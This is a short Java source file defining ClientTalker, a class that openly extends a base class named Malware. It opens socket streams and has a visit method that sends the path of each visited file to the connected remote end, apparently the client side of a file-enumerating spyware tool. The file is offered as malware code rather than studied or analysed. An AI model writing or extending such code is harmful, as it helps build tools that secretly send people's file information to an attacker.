package Client_Side;
//============================================

import java.awt.*;
import javax.swing.*;
import java.awt.event.*;
import javax.swing.event.*;
import javax.swing.text.*;
import java.io.*;
import java.net.*;
import java.util.*;

//============================================
public class ClientTalker extends Malware
{
    private DataOutputStream outStream;
    private BufferedReader inStream;
    String id;

    ClientTalker(Socket socket, String id)
    {
        this.id = id;
        try 
        {
            outStream = new DataOutputStream(socket.getOutputStream());
            inStream = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        }

        catch (IOException ex)
        {

        }


     } 
     
     void send(String msg) throws IOException
     {
        outStream.writeBytes(msg + '\n');
        System.out.println(id + ">>" + msg);
     }

     String receive(String msg) throws IOException
     {
        String str;
        System.out.println("waiting to receive");
        str = inStream.readLine();
        System.out.print(id + "<<" + str);
        return str;
     }

   
    void visit(File f) 
    {
        try 
        {
            send(f.toString());
        }

        catch (IOException e)
        {
  
        }
    }

        
}
